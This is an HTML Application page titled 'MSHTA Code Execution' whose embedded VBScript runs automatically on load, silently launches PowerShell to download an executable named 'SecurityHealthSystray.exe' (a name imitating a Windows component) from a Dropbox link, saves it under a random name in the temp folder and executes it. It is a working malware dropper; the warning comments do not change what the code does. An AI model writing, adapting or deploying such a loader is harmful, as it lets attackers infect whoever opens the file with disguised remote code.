<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MSHTA Code Execution</title>
</head>
<body>

<script type="text/vbscript">
    ' This script will execute when the page loads.
    ' It is highly recommended to use this approach with caution due to security risks.

    Sub Window_onLoad
        ' Create Shell object
        Set objShell = CreateObject("WScript.Shell")
        
        ' Get the temporary folder path
        tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
        
        ' Generate a random file name
        randomFileName = GenerateRandomFileName() & ".hta"
        downloadedFile = tempFolder & "\" & randomFileName
        
        ' Construct the download URL for the hta file
        ' WARNING: Downloading and executing files from external URLs is a significant security risk.
        downloadUrl = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y4/SecurityHealthSystray.exe?rlkey=hqikq51s475ig1nmikxbb5yso&st=b6dky2l0&dl=1"
        
        ' Construct the command to download the file using PowerShell
        cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
        
        ' Run the command
        objShell.Run "cmd.exe /c " & cmdCommand, 0, True
        
        ' Open the downloaded hta file
        objShell.Run downloadedFile, 1, False
        
        ' Clean up
        Set objShell = Nothing
    End Sub

    ' Function to generate a random file name
    Function GenerateRandomFileName()
        Dim randomString
        randomString = ""
        For i = 1 To 10
            randomString = randomString & Chr(Int((90 - 65 + 1) * Rnd + 65))
        Next
        GenerateRandomFileName = randomString
    End Function
</script>

<script>
    // Ensure the VBScript runs on page load
    window.onload = function() {
        Window_onLoad();
    };
</script>

</body>
</html>
